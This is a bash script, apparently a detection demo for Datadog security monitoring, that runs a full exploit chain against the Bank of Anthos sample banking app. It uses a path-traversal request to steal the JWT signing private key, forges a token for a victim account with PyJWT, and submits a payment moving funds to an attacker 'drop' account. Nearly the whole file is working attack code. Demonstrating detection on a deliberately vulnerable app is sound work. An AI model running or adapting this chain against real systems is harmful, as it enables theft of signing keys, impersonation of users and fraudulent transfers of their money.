#!/usr/bin/env bash
#
# Path-traversal -> JWT-forgery -> fund-transfer attack against Bank of Anthos.
#
# Demonstrates a post-auth exploit chain reachable entirely through the public
# frontend service:
#
#   Step 0. AUTH:   Sign up a fresh attacker account via POST /signup. Frontend
#                   auto-logs-in on success, so the response sets a valid token
#                   cookie. The /profile/avatar route requires an authenticated
#                   session — open signup makes that bar trivial to clear.
#
#   Step 1. LFI:    GET /profile/avatar?file=../.ssh/privatekey
#                   Frontend proxies the call to userservice, where an unsafe
#                   os.path.join() in /users/<u>/avatar lets the request escape
#                   the avatars directory and read the JWT signing key.
#
#   Step 2. FORGE:  Sign a JWT for the victim account using the leaked RSA
#                   private key. Same algorithm (RS256) and key the legitimate
#                   userservice would issue, so frontend + ledgerwriter both
#                   validate it as authentic.
#
#   Step 3. DRAIN:  POST /payment to frontend with the forged JWT as the
#                   `token` cookie. Frontend reads `acct` from the token, uses
#                   it as fromAccountNum, and submits the transfer to
#                   ledgerwriter — funds move from victim to attacker drop.
#
# Datadog AAP signals this should light up:
#   * WAF — path traversal pattern (../) in /profile/avatar URL
#   * IAST — tainted open() sink in userservice (if IAST is enabled)
#   * APM trace — forged-token /payment with usr.id == victim, no preceding
#     /login event for that user in the same session
#
# Usage:
#   FRONTEND_URL=http://<frontend-ip> ./docs/lfi-jwt-attack.sh
#
# Requirements: curl, jq, uuidgen, python3 with PyJWT installed.

set -euo pipefail

FRONTEND_URL="${FRONTEND_URL:-http://localhost:8080}"

ATTACKER_USER="attk$(date +%s)"
ATTACKER_PASS="attackerpass"

VICTIM_USER="testuser"
VICTIM_ACCT="1011226111"       # funds drained from here
VICTIM_NAME="Test User"
DROP_ACCT="1077441377"         # eve — funds routed here
AMOUNT_DOLLARS="${AMOUNT_DOLLARS:-99.00}"

cleanup() {
    [[ -n "${KEY_FILE:-}" && -f "${KEY_FILE}" ]] && rm -f "${KEY_FILE}"
    [[ -n "${ATTACKER_COOKIES:-}" && -f "${ATTACKER_COOKIES}" ]] && rm -f "${ATTACKER_COOKIES}"
    [[ -n "${RESP_BODY:-}" && -f "${RESP_BODY}" ]] && rm -f "${RESP_BODY}"
}
trap cleanup EXIT

if ! python3 -c 'import jwt' 2>/dev/null; then
    echo "ERROR: python3 with PyJWT is required (pip install pyjwt cryptography)" >&2
    exit 1
fi

echo "==> Target frontend: ${FRONTEND_URL}"

echo
echo "==> Step 0: sign up a fresh attacker account (${ATTACKER_USER})"
ATTACKER_COOKIES=$(mktemp)
SIGNUP_CODE=$(curl -sS -o /dev/null -w "%{http_code}" \
    -c "${ATTACKER_COOKIES}" \
    -X POST "${FRONTEND_URL}/signup" \
    --data-urlencode "username=${ATTACKER_USER}" \
    --data-urlencode "password=${ATTACKER_PASS}" \
    --data-urlencode "password-repeat=${ATTACKER_PASS}" \
    --data-urlencode "firstname=Mal" \
    --data-urlencode "lastname=Lory" \
    --data-urlencode "birthday=1990-01-01" \
    --data-urlencode "timezone=-5" \
    --data-urlencode "address=123 Attacker Way" \
    --data-urlencode "state=NY" \
    --data-urlencode "zip=10001" \
    --data-urlencode "ssn=123-45-6789")

if ! grep -q $'\ttoken\t' "${ATTACKER_COOKIES}"; then
    echo "ERROR: signup failed (HTTP ${SIGNUP_CODE}); no token cookie returned." >&2
    exit 1
fi
echo "    Account created and auto-logged-in (HTTP ${SIGNUP_CODE})."

echo
echo "==> Step 1: leak userservice JWT private key via path traversal"
echo "    GET ${FRONTEND_URL}/profile/avatar?file=../.ssh/privatekey"

KEY_FILE=$(mktemp)
HTTP_CODE=$(curl -sS -o "${KEY_FILE}" -w "%{http_code}" \
    -b "${ATTACKER_COOKIES}" \
    --get "${FRONTEND_URL}/profile/avatar?file=../.ssh/privatekey")

if [[ "${HTTP_CODE}" != "200" ]] || ! grep -q "PRIVATE KEY" "${KEY_FILE}"; then
    echo "ERROR: traversal failed (HTTP ${HTTP_CODE}). Got:" >&2
    head -c 200 "${KEY_FILE}" >&2
    echo >&2
    exit 1
fi
echo "    Leaked $(wc -c <"${KEY_FILE}") bytes — first line: $(head -1 "${KEY_FILE}")"

echo
echo "==> Step 2: forge JWT for ${VICTIM_USER} (acct ${VICTIM_ACCT}) using leaked key"
TOKEN=$(python3 - "${KEY_FILE}" "${VICTIM_USER}" "${VICTIM_ACCT}" "${VICTIM_NAME}" <<'PY'
import datetime, sys
import jwt

key_path, user, acct, name = sys.argv[1:5]
with open(key_path) as fh:
    key = fh.read()

now = datetime.datetime.utcnow()
payload = {
    'user': user,
    'acct': acct,
    'name': name,
    'iat': now,
    'exp': now + datetime.timedelta(hours=1),
}
print(jwt.encode(payload, key, algorithm='RS256'))
PY
)
echo "    Forged JWT (truncated): ${TOKEN:0:48}..."

echo
echo "==> Step 3: drain victim — POST /payment with forged token cookie"
echo "    Authenticated as ${VICTIM_USER} via forged JWT"
echo "    Routing \$${AMOUNT_DOLLARS} from ${VICTIM_ACCT} to ${DROP_ACCT}"

COOKIE_JAR=$(mktemp)
UUID=$(uuidgen)
RESP_BODY=$(mktemp)
RESP=$(curl -sS -o "${RESP_BODY}" -w "%{http_code}" \
    -c "${COOKIE_JAR}" \
    --cookie "token=${TOKEN}" \
    -X POST "${FRONTEND_URL}/payment" \
    --data-urlencode "account_num=${DROP_ACCT}" \
    --data-urlencode "amount=${AMOUNT_DOLLARS}" \
    --data-urlencode "uuid=${UUID}")

echo "    HTTP ${RESP}"

# Frontend returns 303 on success (redirect to /home with msg=Payment successful)
if [[ "${RESP}" == "303" || "${RESP}" == "302" ]]; then
    echo
    echo "==> EXPLOIT SUCCEEDED: ledger accepted the forged-token transfer."
    echo "    In Datadog, look for:"
    echo "      * WAF event on /profile/avatar with path-traversal payload"
    echo "      * IAST finding on userservice open() sink"
    echo "      * APM trace for POST /payment with usr.id=${VICTIM_USER}"
    echo "        and no preceding /login span for that user"
else
    echo
    echo "==> Attack did not complete cleanly (HTTP ${RESP})."
    echo "    Response body:"
    head -c 400 "${RESP_BODY}"
    echo
fi
